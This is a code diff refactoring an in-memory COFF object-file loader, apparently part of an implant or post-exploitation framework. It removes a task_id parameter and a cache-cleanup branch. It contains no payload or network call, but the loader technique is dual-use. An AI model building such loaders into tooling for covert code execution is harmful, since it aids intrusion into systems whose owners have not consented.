@@ -416,16 +416,16 @@ namespace Objects {
         ZeroFree(exe, sizeof(_executable));
     }
 
-    VOID CoffLoader(char* entrypoint, void* data, void* args, size_t args_size, uint32_t task_id) {
+    VOID CoffLoader(char* entrypoint, void* data, void* args, size_t args_size) {
 
         bool success        = true;
         _executable *exe    = CreateImageData((uint8_t*) data); ;
 
+        // NOTE: sec_map seems to be the only thing that persists
         x_assertb(exe->buffer    = (uint8_t*) data);
         x_assertb(exe->sec_map   = (_object_map*) Malloc(sizeof(void*) * sizeof(_object_map)));
         x_assertb(ImageCheckArch(exe));
 
-        // NOTE: sec_map seems to be the only thing that persists
         exe->fn_map->size = GetFunctionMapSize(exe);
 
         // NOTE: calculating address/size of sections before base relocation
@@ -475,15 +475,9 @@ namespace Objects {
     VOID CoffThread(_coff_params *coff) {
 
         if (!coff->entrypoint || !coff->data) {
-            goto defer;
+            return;
         }
 
-        // TODO: add option to allow/not allow caching
-        CoffLoader(coff->entrypoint, coff->data, coff->args, coff->args_size, coff->task_id);
-
-        defer:
-        if (!coff->b_cache) {
-            RemoveCoff(coff);
-        }
+        CoffLoader(coff->entrypoint, coff->data, coff->args, coff->args_size);
     }
 }
